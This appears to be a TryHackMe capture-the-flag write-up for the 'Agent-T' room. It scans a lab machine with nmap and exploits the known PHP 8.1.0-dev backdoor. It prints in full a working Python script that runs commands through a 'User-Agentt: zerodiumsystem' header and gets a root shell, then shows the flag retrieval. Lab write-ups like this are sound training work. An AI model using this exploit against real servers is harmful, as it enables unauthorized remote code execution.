Agent-T TryHackMe Writeup

Confirming that we have access to the machine:

```bash
ping 10.201.21.41
```
First, run an Nmap scan to determine services, ports, and OS fingerprinting:
```bash
sudo nmap -T4 -sS -O -Pn -SV 10.201.21.41
```

Results:
```bash
    Port 80/tcp (HTTP) is open running PHP 8.1.0-dev

    Several filtered ports

    OS likely Linux kernel 4.x–5.x
```

Navigate to the web service:
```bash

http://10.201.21.41
```

The webpage doesn’t reveal much, but PHP 8.1.0-dev is known to be vulnerable due to a built‑in backdoor.

Search ExploitDB for:

PHP 8.1.0

Exploit link:
https://www.exploit-db.com/exploits/49933

This vulnerability allows Remote Code Execution via a malicious User-Agentt header.

Use the exploit script:
```bash
#!/usr/bin/env python3
import os
import re
import requests

host = input("Enter the full host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
    try:
        while True:
            cmd = input("$ ")
            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0)",
                "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers=headers, allow_redirects=False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>', 1)
            print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit
else:
    print(response)
    print("Host is not available, aborting...")
    exit
```
Run it:
```bash
python php8.1.0exploit.py
Enter the full host url:
http://10.201.21.41

Interactive shell is opened on http://10.201.21.41
$ whoami
root
```
List the root directory:
```bash
ls /

You should see:

bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```
Get the flag:
```bash
cat flag.txt
```
Congratulations — you’ve rooted the machine and completed the room.
